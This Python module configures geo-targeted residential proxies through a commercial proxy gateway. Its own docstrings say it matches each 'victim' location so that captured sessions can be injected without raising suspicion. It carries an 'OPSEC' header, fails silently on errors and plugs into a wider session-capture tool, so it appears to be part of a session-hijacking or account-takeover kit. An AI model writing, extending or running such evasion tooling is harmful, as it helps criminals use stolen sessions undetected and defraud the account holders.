"""
DataImpulse Geolocation Proxy Integration
Source: plan-review-meta-instruction2.md (GAP-006 resolution)
Provides geo-targeted proxies for session injection

OPSEC: No credentials in logs, silent failure on errors
"""

import re
from typing import Dict, Optional
from dataclasses import dataclass


@dataclass
class ProxyConfig:
    """Proxy configuration"""
    protocol: str
    host: str
    port: int
    username: str
    password: str
    
    def to_url(self) -> str:
        """Convert to proxy URL string"""
        return f"{self.protocol}://{self.username}:{self.password}@{self.host}:{self.port}"
    
    def to_dict(self) -> dict:
        """Convert to dictionary format"""
        return {
            'protocol': self.protocol,
            'host': self.host,
            'port': self.port,
            'username': self.username,
            'password': self.password
        }


class DataImpulseIntegration:
    """
    DataImpulse residential proxy integration
    Source: plan.md Section 6.1 - DataImpulse (geolocation proxies)
    
    Provides geo-targeted proxies based on victim location
    for session injection to avoid suspicion
    """
    
    # DataImpulse gateway settings
    GATEWAY_HOST = 'gw.dataimpulse.com'
    SOCKS5_PORT = 823
    HTTP_PORT = 822
    
    def __init__(self, base_user: str = '', api_key: str = ''):
        """
        Initialize DataImpulse integration
        
        Args:
            base_user: DataImpulse username
            api_key: DataImpulse API key/password
        """
        self.base_user = base_user
        self.api_key = api_key
    
    def get_targeted_proxy(
        self,
        country: str = None,
        state: str = None,
        city: str = None,
        protocol: str = 'socks5'
    ) -> Optional[str]:
        """
        Generate geo-targeted proxy string
        Source: plan-review-meta-instruction2.md Task 4.2
        
        Format: socks5://user-country-us-state-ca-city-la:key@gateway
        
        Args:
            country: Country code (e.g., 'us', 'uk', 'de')
            state: State/region code (e.g., 'ca', 'ny', 'tx')
            city: City name (e.g., 'losangeles', 'newyork')
            protocol: Proxy protocol ('socks5' or 'http')
            
        Returns:
            Proxy URL string or None on error
        """
        if not self.base_user or not self.api_key:
            return None
        
        try:
            # Build username with geo-targeting
            username_parts = [self.base_user]
            
            if country:
                username_parts.append(f"country-{self._clean_param(country)}")
            
            if state:
                username_parts.append(f"state-{self._clean_param(state)}")
            
            if city:
                username_parts.append(f"city-{self._clean_param(city)}")
            
            username = '-'.join(username_parts)
            
            # Select port based on protocol
            port = self.SOCKS5_PORT if protocol == 'socks5' else self.HTTP_PORT
            
            return f"{protocol}://{username}:{self.api_key}@{self.GATEWAY_HOST}:{port}"
            
        except Exception:
            return None
    
    def configure_proxy_chain(self, location_data: dict) -> Dict[str, str]:
        """
        Configure proxy chain based on victim location
        Source: plan.md master_watcher2.py integration
        
        Args:
            location_data: Dictionary with country, region, city, isp
            
        Returns:
            Dictionary with proxy configuration
        """
        try:
            # Extract location components
            country = location_data.get('country', '').lower()
            region = location_data.get('region', '').lower()
            city = location_data.get('city', '').lower()
            
            # Generate targeted proxy
            proxy_url = self.get_targeted_proxy(
                country=country if country else None,
                state=region if region else None,
                city=city if city else None,
                protocol='socks5'
            )
            
            if not proxy_url:
                return {}
            
            return {
                'proxy_url': proxy_url,
                'country': country,
                'region': region,
                'city': city,
                'type': 'residential',
                'provider': 'dataimpulse'
            }
            
        except Exception:
            return {}
    
    def _clean_param(self, value: str) -> str:
        """
        Clean parameter value for use in proxy username
        
        - Convert to lowercase
        - Remove spaces and special characters
        - Handle common variations
        """
        if not value:
            return ''
        
        # Lowercase and remove special characters
        cleaned = re.sub(r'[^a-z0-9]', '', value.lower())
        
        return cleaned
    
    def get_proxy_for_session(
        self,
        session_data: dict,
        fallback_country: str = 'us'
    ) -> Optional[ProxyConfig]:
        """
        Get proxy configuration for session injection
        
        Args:
            session_data: Captured session with location data
            fallback_country: Default country if location unknown
            
        Returns:
            ProxyConfig or None
        """
        try:
            location = session_data.get('location', {})
            
            # Try to get geo-targeted proxy
            country = location.get('country', fallback_country)
            region = location.get('region')
            city = location.get('city')
            
            # Build targeting
            username_parts = [self.base_user]
            
            if country:
                username_parts.append(f"country-{self._clean_param(country)}")
            
            if region:
                username_parts.append(f"state-{self._clean_param(region)}")
            
            if city:
                username_parts.append(f"city-{self._clean_param(city)}")
            
            return ProxyConfig(
                protocol='socks5',
                host=self.GATEWAY_HOST,
                port=self.SOCKS5_PORT,
                username='-'.join(username_parts),
                password=self.api_key
            )
            
        except Exception:
            return None
    
    def test_connection(self) -> bool:
        """
        Test proxy connection
        
        Returns:
            bool: True if connection successful
        """
        try:
            import requests
            
            proxy_url = self.get_targeted_proxy(country='us')
            if not proxy_url:
                return False
            
            proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            
            # Test with IP check service
            response = requests.get(
                'https://api.ipify.org?format=json',
                proxies=proxies,
                timeout=30
            )
            
            return response.status_code == 200
            
        except Exception:
            return False
    
    def get_selenium_proxy_options(self, proxy_url: str) -> dict:
        """
        Get Selenium proxy options
        
        Args:
            proxy_url: Proxy URL string
            
        Returns:
            Dictionary for Selenium options
        """
        try:
            # Parse proxy URL
            match = re.match(r'(\w+)://([^:]+):([^@]+)@([^:]+):(\d+)', proxy_url)
            if not match:
                return {}
            
            protocol, user, password, host, port = match.groups()
            
            return {
                'proxy': {
                    'proxyType': 'MANUAL',
                    'socksProxy': f'{host}:{port}',
                    'socksVersion': 5,
                    'socksUsername': user,
                    'socksPassword': password
                }
            }
        except Exception:
            return {}
    
    def get_playwright_proxy_config(self, proxy_url: str) -> dict:
        """
        Get Playwright proxy configuration
        
        Args:
            proxy_url: Proxy URL string
            
        Returns:
            Dictionary for Playwright launch options
        """
        try:
            return {
                'proxy': {
                    'server': proxy_url
                }
            }
        except Exception:
            return {}


# Convenience function for master_watcher2.py integration
def get_hyper_targeted_proxy_string(
    location_data: dict,
    base_user: str = '',
    api_key: str = ''
) -> Optional[str]:
    """
    Get hyper-targeted proxy string for victim location
    Compatible with existing master_watcher2.py pattern
    
    Args:
        location_data: Dictionary with country, region, city
        base_user: DataImpulse base username
        api_key: DataImpulse API key
        
    Returns:
        Proxy URL string or None
    """
    integration = DataImpulseIntegration(base_user=base_user, api_key=api_key)
    return integration.configure_proxy_chain(location_data).get('proxy_url')

